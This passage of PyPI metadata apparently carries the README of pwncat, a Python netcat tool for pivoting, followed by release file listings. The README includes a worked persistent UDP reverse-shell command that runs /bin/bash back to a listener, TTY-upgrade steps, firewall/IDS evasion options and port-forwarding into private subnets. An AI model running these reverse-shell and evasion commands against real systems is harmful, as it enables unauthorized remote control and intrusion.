Ctrl+c), the other one will still stay open in UDP mode.</span>\npwncat -u -l <span class=\"m\">4444</span> &gt; output.txt\npwncat -u localhost <span class=\"m\">4444</span> &lt; input.txt\n</pre>\n<p>There are many ways to alter this default behaviour. Have a look at the <a href=\"#computer-usage\" rel=\"nofollow\">usage</a>\nsection for more advanced adjustments.</p>\n<h2>:closed_book: Documentation</h2>\n<p>Documentation will evolve over time.</p>\n<ul>\n<li>API docs can be found here: <a href=\"https://cytopia.github.io/pwncat/pwncat.api.html\" rel=\"nofollow\">pwncat.api.html</a></li>\n<li>Python type coverage can be found here: <a href=\"https://cytopia.github.io/pwncat/pwncat.type.html\" rel=\"nofollow\">pwncat.type.html</a></li>\n<li>HTML man page can be found here: <a href=\"https://cytopia.github.io/pwncat/pwncat.man.html\" rel=\"nofollow\">pwncat.man.html</a></li>\n<li>Raw man page can be found here: <a href=\"man/pwncat.1\" rel=\"nofollow\">pwncat.1</a></li>\n</ul>\n<h2>:computer: Usage</h2>\n<p>Type <code>pwncat -h</code> or click below to see all available options.</p>\n<details>\n  <summary><strong>Click here to expand usage</strong></summary>\n<pre><code>usage: pwncat [-Cnuv] [-e cmd] hostname port\n       pwncat [-Cnuv] [-e cmd] -l [hostname] port\n       pwncat [-Cnuv] -z hostname port\n       pwncat [-Cnuv] -L addr:port hostname port\n       pwncat [-Cnuv] -R addr:port hostname port\n       pwncat -V, --version\n       pwncat -h, --help\n\n\nEnhanced and comptaible Netcat implementation written in Python (2 and 3) with\nconnect, zero-i/o, listen and forward modes and techniques to detect and evade\nfirewalls and intrusion detection/prevention systems.\n\nIf no mode arguments are specified, pwncat will run in connect mode and act as\na client to connect to a remote endpoint. If the connection to the remote\nendoint is lost, pwncat will quit. See advanced options for how to automatically\nreconnect.\n\npositional arguments:\n  hostname              Address to listen, forward or connect to\n  port                  Port to listen, forward or connect to\n\nmode arguments:\n  -l, --listen          [Listen mode]:\n                        Start a server and listen for incoming connections.\n                        If using TCP and a connected client disconnects or the\n                        connection is interrupted otherwise, the server will\n                        quit. See -k/--keep-open to change this behaviour.\n\n  -z, --zero            [Zero-I/0 mode]:\n                        Connect to a remote endpoint and report status only.\n                        Used for port scanning.\n\n  -L addr:port, --local addr:port\n                        [Local forward mode]:\n                        This mode will start a server and a client internally.\n                        The internal server will listen locally on specified\n                        hostname/port (positional arguments). Same as with -l.\n                        The server will then forward traffic to the internal\n                        client which connects to another server specified by\n                        address given via -L/--local addr:port.\n                        (I.e.: proxies a remote service to a local address)\n\n  -R addr:port, --remote addr:port\n                        [Remote forward mode]:\n                        This mode will start two clients internally. One is\n                        connecting to the target and one is connecting to\n                        another pwncat/netcat server you have started some-\n                        where. Once connected, it will then proxy traffic\n                        between you and the target.\n                        This mode should be applied on machines that block\n                        incoming traffic and only allow outbound.\n                        The connection to your listening server is given by\n                        -R/--remote addr:port and the connection to the\n                        target machine via the positional arguments.\n\noptional arguments:\n  -e cmd, --exec cmd    Execute shell command. Only for connect or listen mode.\n  -C lf, --crlf lf      Specify, 'lf', 'crlf' or 'cr' to always force replacing\n                        line endings for input and outout accordingly. Specify\n                        'no' to completely remove any line feeds. By default\n                        it will not replace anything and takes what is entered\n                        (usually CRLF on Windows, LF on Linux and some times\n                        CR on MacOS).\n  -n, --nodns           Do not resolve DNS.\n  -u, --udp             Use UDP for the connection instead of TCP.\n  -v, --verbose         Be verbose and print info to stderr. Use -v, -vv, -vvv\n                        or -vvvv for more verbosity. The server performance will\n                        decrease drastically if you use more than three times.\n  -c str, --color str   Colored log output. Specify 'always', 'never' or 'auto'.\n                        In 'auto' mode, color is displayed as long as the output\n                        goes to a terminal. If it is piped into a file, color\n                        will automatically be disabled. This mode also disables\n                        color on Windows by default. (default: auto)\n\nadvanced arguments:\n  --script-send file    All modes (TCP and UDP):\n                        A Python scripting engine to define your own custom\n                        transformer function which will be executed before\n                        sending data to a remote endpoint. Your file must\n                        contain the exact following function which will:\n                        be applied as the transformer:\n                        def transform(data):\n                            # NOTE: the function name must be 'transform'\n                            # NOTE: the function param name must be 'data'\n                            # NOTE: indentation must be 4 spaces\n                            # ... your transformations goes here\n                            return data\n                        You can also define as many custom functions or classes\n                        within this file, but ensure to prefix them uniquely to\n                        not collide with pwncat's function or classes, as the\n                        file will be called with exec().\n\n  --script-recv file    All modes (TCP and UDP):\n                        A Python scripting engine to define your own custom\n                        transformer function which will be executed after\n                        receiving data from a remote endpoint. Your file must\n                        contain the exact following function which will:\n                        be applied as the transformer:\n                        def transform(data):\n                            # NOTE: the function name must be 'transform'\n                            # NOTE: the function param name must be 'data'\n                            # NOTE: indentation must be 4 spaces\n                            # ... your transformations goes here\n                            return data\n                        You can also define as many custom functions or classes\n                        within this file, but ensure to prefix them uniquely to\n                        not collide with pwncat's function or classes, as the\n                        file will be called with exec().\n\n  --http                Connect / Listen / Local forward mode (TCP only):\n                        Hide traffic in http packets to fool Firewalls/IDS/IPS.\n\n  --https               Connect / Listen / Local forward mode (TCP only):\n                        Hide traffic in https packets to fool Firewalls/IDS/IPS.\n\n  -k, --keep-open       Listen mode (TCP only):\n                        Re-accept new clients in listen mode after a client has\n                        disconnected or the connection is unterrupted otherwise.\n                        (default: server will quit after connection is gone)\n\n  --rebind x            Listen mode (TCP and UDP):\n                        If the server is unable to bind, it will re-initialize\n                        itself x many times before giving up. Use -1 to re-init\n                        endlessly. (default: fail after first unsuccessful try).\n\n  --rebind-wait s       Listen mode (TCP and UDP):\n                        Wait x seconds between re-initialization. (default: 1)\n\n  --rebind-robin port   Listen mode (TCP and UDP):\n                        If the server is unable to initialize (e.g: cannot bind\n                        and --rebind is specified, it it will shuffle ports in\n                        round-robin mode to bind to. Use comma separated string\n                        such as '80,81,82' or a range of ports '80-100'.\n                        Set --rebind to at least the number of ports to probe +1\n                        This option requires --rebind to be specified.\n\n  --reconn x            Connect mode / Zero-I/O mode (TCP only):\n                        If the remote server is not reachable or the connection\n                        is interrupted, the client will connect again x many\n                        times before giving up. Use -1 to retry endlessly.\n                        (default: quit if the remote is not available or the\n                        connection was interrupted)\n                        This might be handy for stable TCP reverse shells ;-)\n\n  --reconn-wait s       Connect mode / Zero-I/O mode (TCP only):\n                        Wait x seconds between re-connects. (default: 1)\n\n  --reconn-robin port   Connect mode / Zero-I/O mode (TCP only):\n                        If the remote server is not reachable or the connection\n                        is interrupted and --reconn is specified, the client\n                        will shuffle ports in round-robin mode to connect to.\n                        Use comma separated string such as '80,81,82' or a range\n                        of ports '80-100'.\n                        Set --reconn to at least the number of ports to probe +1\n                        This helps reverse shell to evade intrusiona prevention\n                        systems that will cut your connection and block the\n                        outbound port.\n                        This is also useful in Connect or Zero-I/O mode to\n                        figure out what outbound ports are allowed.\n\n  -w s, --wait s        Connect mode (TCP only):\n                        If a connection and stdin are idle for more than s sec,\n                        then the connection is silently closed and the client\n                        will exit. (default: wait forever).\n                        Note: if --reconn is specified, the connection will be\n                        re-opened.\n\n  --ping-init           Connect mode / Zero-I/O mode (TCP and UDP):\n                        UDP is a stateless protocol unlike TCP, so no hand-\n                        shake communication takes place and the client just\n                        sends data to a server without being \"accepted\" by\n                        the server first.\n                        This means a server waiting for an UDP client to\n                        connect to, is unable to send any data to the client,\n                        before the client hasn't send data first. The server\n                        simply doesn't know the IP address before an initial\n                        connect.\n                        The --ping-init option instructs the client to send one\n                        single initial ping packet to the server, so that it is\n                        able to talk to the client.\n                        This is the only way to make a UDP reverse shell work.\n                        See --ping-word for what char/string to send as initial\n                        ping packet (default: '\\0')\n\n  --ping-intvl s        Connect mode / Zero-I/O mode (TCP and UDP):\n                        Instruct the client to send ping intervalls every s sec.\n                        This allows you to restart your UDP server and just wait\n                        for the client to report back in. This might be handy\n                        for stable UDP reverse shells ;-)\n                        See --ping-word for what char/string to send as initial\n                        ping packet (default: '\\0')\n\n  --ping-word str       Connect mode / Zero-I/O mode (TCP and UDP):\n                        Change the default character '\\0' to use for upd ping.\n                        Single character or strings are supported.\n\n  --ping-robin port     Connect mode / Zero-I/O mode (TCP and UDP):\n                        Instruct the client to shuffle the specified ports in\n                        round-robin mode for a remote server to ping.\n                        This might be handy to scan outbound allowed ports.\n                        Use --ping-intvl 0 to be faster.\n\n  --safe-word str       All modes:\n                        If pwncat is started with this argument, it will shut\n                        down as soon as it receives the specified string. The\n                        --keep-open (server) or --reconn (client) options will\n                        be ignored and it won't listen again or reconnect to you.\n                        Use a very unique string to not have it shut down\n                        accidentally by other input.\n\nmisc arguments:\n  -h, --help            Show this help message and exit\n  -V, --version         Show version information and exit\n</code></pre>\n</details>\n<h2>:bulb: Examples</h2>\n<h3>Upgrade your shell to interactive</h3>\n\n<blockquote>\n<p>This is a universal advice and not only works with <code>pwncat</code>, but with all other common tools.</p>\n</blockquote>\n<p>When connected with a reverse or bind shell you'll notice that no interactive commands will work and\nhitting <kbd>Ctrl</kbd>+<kbd>c</kbd> will terminate your session.\nTo fix this, you'll need to attach it to a TTY. Here's how:</p>\n<pre>python3 -c <span class=\"s1\">'import pty; pty.spawn(\"/bin/bash\")'</span>\n</pre>\n<p><kbd>Ctrl</kbd>+<kbd>z</kbd></p>\n<pre>stty size\nstty <span class=\"nb\">echo</span> -raw\n<span class=\"nb\">fg</span>\nreset\n<span class=\"nb\">export</span> <span class=\"nv\">SHELL</span><span class=\"o\">=</span>bash\n<span class=\"nb\">export</span> <span class=\"nv\">TERM</span><span class=\"o\">=</span>xterm\nstty rows &lt;num&gt; columns &lt;num&gt;   <span class=\"c1\"># values found above by 'stty size'</span>\n</pre>\n\n<h3>Unbreakable UDP reverse shell</h3>\n\n<p>Why unbreakable? Because it will keep coming to you, even if you kill your listening server temporarily.</p>\n<pre><span class=\"c1\"># The client</span>\n<span class=\"c1\"># --exec            # Provide this executable</span>\n<span class=\"c1\"># --nodns           # Keep the noise down and don't resolve hostnames</span>\n<span class=\"c1\"># --udp             # Use UDP mode</span>\n<span class=\"c1\"># --ping-intvl      # Ping the server every 10 seconds</span>\n\npwncat --exec /bin/bash --nodns --udp --ping-intvl <span class=\"m\">10</span> <span class=\"m\">10</span>.0.0.1 <span class=\"m\">4444</span>\n</pre>\n<p>If you feel like, you can start your listener in full TRACE logging mode to figure out what's going on</p>\n<pre><span class=\"c1\"># The server</span>\n<span class=\"c1\"># -u   # Use UDP mode</span>\n<span class=\"c1\"># -l   # Listen for incoming connections</span>\npwncat -u -l -vvvvv\n</pre>\n<p>You will see (among all the gibberish) a TRACE message:</p>\n<pre><code>[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:43213'\n</code></pre>\n<p>As soon as you saw this on the listener, you can issue commands to the client.\nAll the debug messages are also not necessary, so you can safely <kbd>Ctrl</kbd>+<kbd>c</kbd> terminate\nyour server and start it again in silent mode:</p>\n<pre><span class=\"c1\"># The server</span>\npwncat -u -l -vvvvv\n</pre>\n<p>Now wait a maximum of 10 seconds and you can issue commands.\nHaving no info messages at all, is also troublesome. You might want to know what is going\non behind the scences or? Safely <kbd>Ctrl</kbd>+<kbd>c</kbd> terminate your server and redirect\nthe notifications to a logfile:</p>\n<pre><span class=\"c1\"># The server</span>\n<span class=\"c1\"># 2&gt; comm.txt   # This redirects the messages to a logfile instead</span>\npwncat -u -l -vvv <span class=\"m\">2</span>&gt; comm.txt\n</pre>\n<p>Now all you'll see in your server window are the actual command inputs and outputs.\nIf you want to see what's going on behind the scene, open a second terminal window and tail\nthe <code>comm.txt</code> file:</p>\n<pre><code># View communication info\ntail -fn50 comm.txt\n\n[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'\n[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'\n[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'\n[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'\n[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'\n</code></pre>\n\n<h3>Port forwarding magic</h3>\n\n<h4>Local TCP port forwarding</h4>\n<p><strong>Scenario</strong></p>\n<ol>\n<li>Alice can be reached from the Outside (TCP/UDP)</li>\n<li>Bob can only be reached from Alice's machine</li>\n</ol>\n<pre><code>                              |                               |\n        Outside               |           DMZ                 |        private subnet\n                              |                               |\n                              |                               |\n     +-----------------+     TCP     +-----------------+     TCP     +-----------------+\n     | The cat         | -----|----&gt; | Alice           | -----|----&gt; | Bob             |\n     |                 |      |      | pwncat          |      |      | MySQL           |\n     | 56.0.0.1        |      |      | 72.0.0.1:3306   |      |      | 10.0.0.1:3306   |\n     +-----------------+      |      +-----------------+      |      +-----------------+\n     pwncat 72.0.0.1 3306     |      pwncat \\                 |\n                              |        -L 72.0.0.1:3306 \\     |\n                              |         10.0.0.1 3306         |\n</code></pre>\n<h4>Local UDP port forwarding</h4>\n<p><strong>Scenario</strong></p>\n<ol>\n<li>Alice can be reached from the Outside (but only via UDP)</li>\n<li>Bob can only be reached from Alice's machine</li>\n</ol>\n<pre><code>                              |                               |\n        Outside               |           DMZ                 |        private subnet\n                              |                               |\n                              |                               |\n     +-----------------+     UDP     +-----------------+     TCP     +-----------------+\n     | The cat         | -----|----&gt; | Alice           | -----|----&gt; | Bob             |\n     |                 |      |      | pwncat -L       |      |      | MySQL           |\n     | 56.0.0.1        |      |      | 72.0.0.1:3306   |      |      | 10.0.0.1:3306   |\n     +-----------------+      |      +-----------------+      |      +-----------------+\n     pwncat -u 72.0.0.1 3306  |      pwncat -u \\              |\n                              |        -L 72.0.0.1:3306 \\     |\n                              |        10.0.0.1 3306          |\n</code></pre>\n<h4>Remote TCP port forward</h4>\n<p><strong>Scenario</strong></p>\n<ol>\n<li>Alice cannot be reached from the Outside</li>\n<li>Alice is allowed to connect to the Outside (TCP/UDP)</li>\n<li>Bob can only be reached from Alice's machine</li>\n</ol>\n<pre><code>                              |                               |\n        Outside               |           DMZ                 |        private subnet\n                              |                               |\n                              |                               |\n     +-----------------+     TCP     +-----------------+     TCP     +-----------------+\n     | The cat         | &lt;----|----- | Alice           | -----|----&gt; | Bob             |\n     |                 |      |      | pwncat          |      |      | MySQL           |\n     | 56.0.0.1        |      |      | 72.0.0.1:3306   |      |      | 10.0.0.1:3306   |\n     +-----------------+      |      +-----------------+      |      +-----------------+\n     pwncat -l 4444           |      pwncat --reconn \\        |\n                              |        -R 56.0.0.1:4444 \\     |\n                              |        10.0.0.1 3306          |\n</code></pre>\n<h4>Remote UDP port forward</h4>\n<p><strong>Scenario</strong></p>\n<ol>\n<li>Alice cannot be reached from the Outside</li>\n<li>Alice is allowed to connect to the Outside (UDP: DNS only)</li>\n<li>Bob can only be reached from Alice's machine</li>\n</ol>\n<pre><code>                              |                               |\n        Outside               |           DMZ                 |        private subnet\n                              |                               |\n                              |                               |\n     +-----------------+     UDP     +-----------------+     TCP     +-----------------+\n     | The cat         | &lt;----|----- | Alice           | -----|----&gt; | Bob             |\n     |                 |      |      | pwncat          |      |      | MySQL           |\n     | 56.0.0.1        |      |      | 72.0.0.1:3306   |      |      | 10.0.0.1:3306   |\n     +-----------------+      |      +-----------------+      |      +-----------------+\n     pwncat -u -l 53          |      pwncat -u --reconn \\     |\n                              |        -R 56.0.0.1:4444 \\     |\n                              |        10.0.0.1 3306          |\n</code></pre>\n\n<h3>Pwncat Scripting Engine (<a href=\"pse\" rel=\"nofollow\">PSE</a>)</h3>\n<p><code>pwncat</code> offers a Python based scripting engine to inject your custom code before sending and\nafter receiving data.</p>\n<h4>How it works</h4>\n<p>You will simply need to provide a Python file with the following function:</p>\n<pre><span class=\"k\">def</span> <span class=\"nf\">transform</span><span class=\"p\">(</span><span class=\"n\">data</span><span class=\"p\">):</span>\n    <span class=\"c1\"># Example to reverse a string</span>\n    <span class=\"k\">return</span> <span class=\"n\">data</span><span class=\"p\">[::</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">]</span>\n</pre>\n<p>Both, the function name must be named <code>transform</code> and the parsed argument name must be <code>data</code>.\nOther than that you can add as much code as you like. Each instance of <code>pwncat</code> can take two scripts:</p>\n<ol>\n<li><code>--script-send</code>: script will be applied before sending</li>\n<li><code>--script-recv</code>: script will be applied after receiving</li>\n</ol>\n<h4>Example 1: Self-built asymmetric encryption</h4>\n<blockquote>\n<p>PSE: <a href=\"pse/asym-enc\" rel=\"nofollow\">asym-enc</a> source code</p>\n</blockquote>\n<p>This will encrypt your traffic asymmetrically. It is just a very basic <a href=\"https://en.wikipedia.org/wiki/ROT13\" rel=\"nofollow\">ROT13</a> implementation with different shift lengths on both sides to <em>emulate</em> asymmetry. You could do the same and implement GPG based asymmetric encryption for PSE.</p>\n<pre><span class=\"c1\"># server</span>\npwncat -vvvv -l localhost <span class=\"m\">4444</span> <span class=\"se\">\\</span>\n  --script-send pse/asym-enc/pse-asym_enc-server_send.py <span class=\"se\">\\</span>\n  --script-recv pse/asym-enc/pse-asym_enc-server_recv.py\n</pre>\n<pre><span class=\"c1\"># client</span>\npwncat -vvvv localhost <span class=\"m\">4444</span> <span class=\"se\">\\</span>\n  --script-send pse/asym-enc/pse-asym_enc-client_send.py <span class=\"se\">\\</span>\n  --script-recv pse/asym-enc/pse-asym_enc-client_recv.py\n</pre>\n<h4>Example 2: Self-built HTTP POST wrapper</h4>\n<blockquote>\n<p>PSE: <a href=\"pse/http-post\" rel=\"nofollow\">http-post</a> source code</p>\n</blockquote>\n<p>This will wrap all traffic into a valid HTTP POST request, making it look like normal HTTP traffic.</p>\n<pre><span class=\"c1\"># server</span>\npwncat -vvvv -l localhost <span class=\"m\">4444</span> <span class=\"se\">\\</span>\n  --script-send pse/http-post/pse-http_post-pack.py <span class=\"se\">\\</span>\n  --script-recv pse/http-post/pse-http_post-unpack.py\n</pre>\n<pre><span class=\"c1\"># client</span>\npwncat -vvvv localhost <span class=\"m\">4444</span> <span class=\"se\">\\</span>\n  --script-send pse/http-post/pse-http_post-pack.py <span class=\"se\">\\</span>\n  --script-recv pse/http-post/pse-http_post-unpack.py\n</pre>\n<h2>:information_source: FAQ</h2>\n<p><strong>Q</strong>: Is <code>pwncat</code> compatible with <code>netcat</code>?</p>\n<p><strong>A</strong>: Yes, it is fully compatible in the way it behaves in connect, listen and zero-i/o mode.</p>\n<p><strong>Q</strong>: Does it work on X?</p>\n<p><strong>A</strong>: In its current state it works with Python 2 and 3 and is fully tested on Linux and MacOS. Windows support is still experimental.</p>\n<p><strong>Q</strong>: I found a bug / I have to suggest a new feature! What can I do?</p>\n<p><strong>A</strong>: For bug reports or enhancements, please open an issue <a href=\"https://github.com/cytopia/pwncat/issues\" rel=\"nofollow\">here</a>.</p>\n<h2>:lock: <a href=\"https://github.com/cytopia\" rel=\"nofollow\">cytopia</a> sec tools</h2>\n<p>Below is a list of sec tools and docs I am maintaining.</p>\n<table>\n<thead>\n<tr>\n<th>Name</th>\n<th>Category</th>\n<th>Language</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong><a href=\"https://github.com/cytopia/offsec\" rel=\"nofollow\">offsec</a></strong></td>\n<td>Documentation</td>\n<td>Markdown</td>\n<td>Offsec checklist, tools and examples</td>\n</tr>\n<tr>\n<td><strong><a href=\"https://github.com/cytopia/header-fuzz\" rel=\"nofollow\">header-fuzz</a></strong></td>\n<td>Enumeration</td>\n<td>Bash</td>\n<td>Fuzz HTTP headers</td>\n</tr>\n<tr>\n<td><strong><a href=\"https://github.com/cytopia/smtp-user-enum\" rel=\"nofollow\">smtp-user-enum</a></strong></td>\n<td>Enumeration</td>\n<td>Python 2+3</td>\n<td>SMTP users enumerator</td>\n</tr>\n<tr>\n<td><strong><a href=\"https://github.com/cytopia/urlbuster\" rel=\"nofollow\">urlbuster</a></strong></td>\n<td>Enumeration</td>\n<td>Python 2+3</td>\n<td>Mutable web directory fuzzer</td>\n</tr>\n<tr>\n<td><strong><a href=\"https://github.com/cytopia/pwncat\" rel=\"nofollow\">pwncat</a></strong></td>\n<td>Pivoting</td>\n<td>Python 2+3</td>\n<td>Cross-platform netcat on steroids</td>\n</tr>\n<tr>\n<td><strong><a href=\"https://github.com/cytopia/badchars\" rel=\"nofollow\">badchars</a></strong></td>\n<td>Reverse Engineering</td>\n<td>Python 2+3</td>\n<td>Badchar generator</td>\n</tr>\n<tr>\n<td><strong><a href=\"https://github.com/cytopia/fuzza\" rel=\"nofollow\">fuzza</a></strong></td>\n<td>Reverse Engineering</td>\n<td>Python 2+3</td>\n<td>TCP fuzzing tool</td>\n</tr></tbody></table>\n<h2>:octocat: Contributing</h2>\n<p>See <strong><a href=\"CONTRIBUTING.md\" rel=\"nofollow\">Contributing guidelines</a></strong> to help to improve this project.</p>\n<h2>:exclamation: Disclaimer</h2>\n<p>This tool may be used for legal purposes only. Users take full responsibility for any actions performed using this tool. The author accepts no liability for damage caused by this tool. If these terms are not acceptable to you, then do not use this tool.</p>\n<h2>:page_facing_up: License</h2>\n<p><strong><a href=\"LICENSE.txt\" rel=\"nofollow\">MIT License</a></strong></p>\n<p>Copyright (c) 2020 <strong><a href=\"https://github.com/cytopia\" rel=\"nofollow\">cytopia</a></strong></p>\n\n          </div>"}, "last_serial": 7193910, "releases": {"0.0.10a0": [{"comment_text": "", "digests": {"md5": "199c07cd7979efc0a944dfad2b04f826", "sha256": "4f330f2e276e0fffe65a9d12312fd57b2be7726846f557e82f6cb689d1df7790"}, "downloads": -1, "filename": "pwncat-0.0.10a0-py2.py3-none-any.whl", "has_sig": false, "md5_digest": "199c07cd7979efc0a944dfad2b04f826", "packagetype": "bdist_wheel", "python_version": "py2.py3", "requires_python": null, "size": 28254, "upload_time": "2020-05-01T16:45:30", "upload_time_iso_8601": "2020-05-01T16:45:30.411800Z", "url": "https://files.pythonhosted.org/packages/6d/ca/278cd0c571c59f910bd63080a1ce2433310f245c37c2e3743a835583eaf4/pwncat-0.0.10a0-py2.py3-none-any.whl", "yanked": false}, {"comment_text": "", "digests": {"md5": "a9492df4fe5c5add07168af1eade2d7d", "sha256": "a867ed5195bec262180cb0b1d30772b92dbf4a715d6d8cdcf66fe107fb18b897"}, "downloads": -1, "filename": "pwncat-0.0.10a0.tar.gz", "has_sig": false, "md5_digest": "a9492df4fe5c5add07168af1eade2d7d", "packagetype": "sdist", "python_version": "source", "requires_python": null, "size": 40565, "upload_time": "2020-05-01T16:45:33", "upload_time_iso_8601": "2020-05-01T16:45:33.409056Z", "url": "https://files.pythonhosted.org/packages/d5/69/ac6b1d7dc5263420ec072c5e900c699c7ab2d73408eb6c2f1506d5872862/pwncat-0.0.10a0.tar.gz", "yanked": false}], "0.0.11a0": [{"comment_text": "", "digests": {"md5": "9ac7d6849b27c7911b17ee1d0c74be10", "sha256": "6ea7734e8626d47437e01c829132dec35e276f04523407f334f150d8450f4fc9"}, "downloads": -1, "filename": "pwncat-0.0.11a0-py2.py3-none-any.whl", "has_sig": false, "md5_digest": "9ac7d6849b27c7911b17ee1d0c74be10", "packagetype": "bdist_wheel", "python_version": "py2.py3", "requires_python": null, "size": 32502, "upload_time": "2020-05-07T20:35:22", "upload_time_iso_8601": "2020-05-07T20:35:22.691295Z", "url": "https://files.pythonhosted.org/packages/da/24/ed34664ea22fddd94a4f14c6fd28cd178adee262daf5c008202a7c102268/pwncat-0.0.11a0-py2.py3-none-any.whl", "yanked": false}, {"comment_text": "", "digests": {"md5": "5ba95c3d8f8a564bdda8176b8e343376", "sha256": "fb72c49524f248967611eeee291e478a2d227d4440621886d53c33cdf9c6eb78"}, "downloads": -1, "filename": "pwncat-0.0.11a0.tar.gz", "has_sig": false, "md5_digest": "5ba95c3d8f8a564bdda8176b8e343376", "packagetype": "sdist", "python_version": "source", "requires_python": null, "size": 48368, "upload_time": "2020-05-07T20:35:24", "upload_time_iso_8601": "2020-05-07T20:35:24.129181Z", "url": "https://files.pythonhosted.org/packages/93/bb/4ee7b6cbca861dfc0df7b69cef4c97dead1b955ddbf38e052bbc1982463a/pwncat-0.0.11a0.tar.gz", "yanked": false}], "0.0.12a0": [{"comment_text": "", "digests": {"md5": "9b9c09501f4a1358bd7376a5314443cb", "sha256": "69c49fbb92ab15e965b00f233a09adcfaebc5442f465a2debb4076e43912e7ec"}, "downloads": -1, "filename": "pwncat-0.0.12a0-py2.py3-none-any.whl", "has_sig": false, "md5_digest": "9b9c09501f4a1358bd7376a5314443cb", "packagetype": "bdist_wheel", "python_version": "py2.py3", "requires_python": null, "size": 34689, "upload_time": "2020-05-08T03:28:45", "upload_time_iso_8601": "2020-05-08T03:28:45.582072Z", "url": "https://files.pythonhosted.org/packages/88/62/0cc0467223a9550a531d943633193ec46a262b4bdee3edbc24b81d4a6538/pwncat-0.0.12a0-py2.py3-none-any.whl", "yanked": false}, {"comment_text": "", "digests": {"md5": "ac9ac64e320a2bff31055b303f148695", "sha256": "1916f71e50ae51beccaa66fdafd40f0e85046f1ab114ef86b93bb4b47c7772c6"}, "downloads": -1, "filename": "pwncat-0.0.12a0.tar.gz", "has_sig": false, "md5_digest": "ac9ac64e320a2bff31055b303f148695", "packagetype": "sdist", "python_version": "source", "requires_python": null, "size": 53173, "upload_time": "2020-05-08T03:28:47", "upload_time_iso_8601": "2020-05-08T03:28:47.471520Z", "url": "https://files.pythonhosted.org/packages/52/29/8446ebe7a990ab14a1ffc2e0d71d108914e551c1d587b86f3c4124cdf5e4/pwncat-0.0.12a0.tar.gz", "yanked": false}], "0.0.2a0": [{"comment_text": "", "digests": {"md5": "5c817e59d54414b16e34a4023ae75442", "sha256": "1f401ea3dd6a734aeca826877e5b22caa7dbc8fa842592b64cb0eacdf473b97f"}, "downloads": -1, "filename": "pwncat-0.0.2a0-py2.py3-none-any.whl", "has_sig": false, "md5_digest": "5c817e59d54414b16e34a4023ae75442", "packagetype": "bdist_wheel", "python_version": "py2.py3", "requires_python": null, "size": 13916, "upload_time": "2020-04-18T13:17:48", "upload_time_iso_8601": "2020-04-18T13:17:48.230176Z", "url": "https://files.pythonhosted.org/packages/83/55/8645a06fd6784ba05d7f013b0e4aa8c54f6814d31a459419d79b7cac4097/pwncat-0.0.2a0-py2.py3-none-any.whl", "yanked": false}, {"comment_text": "", "digests": {"md5": "51e5e06c65390c256950631342b3b38e", "sha256": "4a61d156e62f54d25f6952e349c39d5c0fe0edc3079be178999d1f8a920a6f17"}, "downloads": -1, "filename": "pwncat-0.0.2a0.tar.gz", "has_sig": false, "md5_digest": "51e5e06c65390c256950631342b3b38e", "packagetype": "sdist", "python_version": "source", "requires_python": null, "size": 12896, "upload_time": "2020-04-18T13:17:50", "upload_time_iso_8601": "2020-04-18T13:17:50.782578Z", "url": "https://files.pythonhosted.org/packages/15/a6/815984d9a64b9afc803b2425dde9f814913e4d56dc7495919730f8049ee7/pwncat-0.0.2a0.tar.gz", "yanked": false}], "0.0.3a0": [{"comment_text": "", "digests": {"md5": "07b3c06329df7548ab30b820fae6bf3d", "sha256": "92cc85510b8004642ca5d6e29d5e9dec905082727625dd9de6825be4748b8e43"}, "downloads": -1, "filename": "pwncat-0.0.3a0-py2.py3-none-any.whl", "has_sig": false, "md5_digest": "07b3c06329df7548ab30b820fae6bf3d", "packagetype": "bdist_wheel", "python_version": "py2.py3", "requires_python": null, "size": 15576, "upload_time": "2020-04-18T20:16:42", "upload_time_iso_8601": "2020-04-18T20:16:42.203518Z", "url": "https://files.pythonhosted.org/packages/88/8d/9c59817da4056d01b61df86d6d83929a5315001d14b15ecd6aa0c2a6c824/pwncat-0.0.3a0-py2.py3-none-any.whl", "yanked": false}, {"comment_text": "", "digests": {"md5": "7eeb0ac666e1bf3ba1a437b5536fadf6", "sha256": "178cf87e3c9cd7f9645170b77ca7501ad616470205df46f30bbb47ecf2ab49d8"}, "downloads": -1, "filename": "pwncat-0.0.3a0.tar.gz", "has_sig": false, "md5_digest": "7eeb0ac666e1bf3ba1a437b5536fadf6", "packagetype": "sdist", "python_version": "source", "requires_python": null, "size": 14761, "upload_time": "2020-04-18T20:16:43", "upload_time_iso_8601": "2020-04-18T20:16:43.844399Z", "url": "https://files.pythonhosted.org/packages/83/dd/8a33b6ae2f8a4d784b2334dfaf0cb1397fab1b2ee266cd24456d6f302b40/pwncat-0.0.3a0.tar.gz", "yanked": false}], "0.0.4a0": [{"comment_text": "", "digests": {"md5": "fab3f18f1059ec788d96b0bd60647a09", "sha256": "6749e3f5032bfbc58431ace59e06a7daab01b9749fdee951fa32a81d055e147e"}, "downloads": -1, "filename": "pwncat-0.0.4a0-py2.py3-none-any.whl", "has_sig": false, "md5_digest": "fab3f18f1059ec788d96b0bd60647a09", "packagetype": "bdist_wheel", "python_version": "py2.py3", "requires_python": null, "size": 17007, "upload_time": "2020-04-18T22:14:46", "upload_time_iso_8601": "2020-04-18T22:14:46.102342Z", "url": "https://files.pythonhosted.org/packages/f0/5f/d57ab3497a724786ae878f31e6da87476c4a4b0567903d983dce64fb11b8/pwncat-0.0.4a0-py2.py3-none-any.whl", "yanked": false}, {"comment_text": "", "digests": {"md5": "2f7ed2afee6461d0e23f778ffa213fbc", "sha256": "759d59602f52f661fd97d254d503a979eb3505b67f2cc6e5e1c9c4def098601f"}, "downloads": -1, "filename": "pwncat-0.0.4a0.tar.gz", "has_sig": false, "md5_digest": "2f7ed2afee6461d0e23f778ffa213fbc", "packagetype": "sdist", "python_version": "source", "requires_python": null, "size": 16397, "upload_time": "2020-04-18T22:14:47", "upload_time_iso_8601": "2020-04-18T22:14:47.639783Z", "url": "https://files.pythonhosted.org/packages/04/b1/058d309a33d6213032a2da7f429ee028287a9f685094c4be078b803d1eb7/pwncat-0.0.4a0.tar.gz", "yanked": false}], "0.0.5a0": [{"comment_text": "", "digests": {"md5": "498936a97608723dfa017b67958ba763", "sha256": 